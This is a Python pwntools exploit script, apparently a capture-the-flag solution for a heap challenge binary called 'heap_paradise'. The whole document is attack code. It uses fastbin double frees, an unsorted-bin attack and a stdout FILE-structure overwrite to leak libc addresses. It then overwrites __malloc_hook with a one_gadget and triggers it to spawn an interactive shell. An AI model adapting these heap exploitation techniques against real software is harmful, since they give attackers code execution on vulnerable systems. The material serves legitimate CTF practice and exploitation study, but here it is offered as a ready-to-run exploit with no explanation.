from pwn import *
def add(option, size, data):
	if(option==0):
		s.recvuntil("You Choice:")
		s.send("1\n")
		s.recvuntil("Size :")
		s.send(str(size))
		s.recvuntil("Data :")
		s.send(data)
	else:
		s.send("1\n")
		s.recvuntil("Size :")
		s.send(str(size))
		s.recvuntil("Data :")
		s.send(data)
def free(option, index):
	if(option==0):
		s.recvuntil("You Choice:")
		s.send("2\n")
		s.recvuntil("Index :")
		s.send(str(index))
	else:
		s.send("2\n")
		s.recvuntil("Index :")
		s.send(str(index))

#s=process("./heap_paradise", env={"LD_PRELOAD":"./libc_64.so.6"})
s=process("./heap_paradise")
add(0,0x68,'a'*88+p64(0x71))#0
add(0,0x68,'b'*88+p64(0x71))#1
add(0,0x68,"c"*24+p64(0x21)+"\x00"*24+"e")#2
free(0,0)
free(0,1)
free(0,0)
add(0,0x68,"\x60") #3->double free bug attack
add(0,0x68,"A") #4
add(0,0x68,"A") #5

add(0,0x68,p64(0xdeadbeef)+p64(0x91))#6/0
free(0,1)#->unsorted bin attack/1
add(0,0x68,"\xdd\xf5")#7(_IO_2_1_stdout_-0x43)
free(0,0)
free(0,6)#/2
free(0,0)#->double free bug attack
add(0,0x68,'d'*88+p64(0x71)+'\x70')#8
add(0,0x68,"A")#9/3
add(0,0x68,"A")#10
s.recvuntil("You Choice:")
s.send("1\n")
s.recvuntil("Size :")
s.send(str(0x68))
s.recvuntil("Data :")
s.send("\x00"*(0x43-0x10)+p64(0xfbad1800)+p64(0)*3+"\x00")#11 # fsop stdout's flag
a=s.recv(2048)[0x48:0x48+6]
libc_leak=u64(a+"\x00\x00")
_IO_2_1_stdout_=libc_leak-0x7fc1b773f6a3+0x7fc1b773f620
one_gadget=libc_leak-0x7fc1b773f6a3+0x7fc1b73bf390-0x45390+0xf02a4
malloc_hook=libc_leak-0x7fecdc94f6a3+0x7fecdc94eb10
print(hex(libc_leak))
print(hex(_IO_2_1_stdout_))
print(hex(one_gadget))
print(hex(malloc_hook))
free(1,0)
free(0,6)
free(0,0)#->double free bug
#add(0,0x68,p64(_IO_2_1_stdout_+157))#11
add(0,0x68,p64(malloc_hook-35))#11->fastbin-dup attack
add(0,0x68,"B")#12
add(0,0x68,"B")#13
#payload=p64(0)*2+"\x00"*3+p64(0xffffffff)+p64(0)+p64(one_gadget)+p64(_IO_2_1_stdout_+208-0x38)
payload="a"*19+p64(one_gadget)
add(0,0x68,payload)#14
free(0,0)#->by triggering error in free, using malloc_printerr
s.interactive()
s.close()
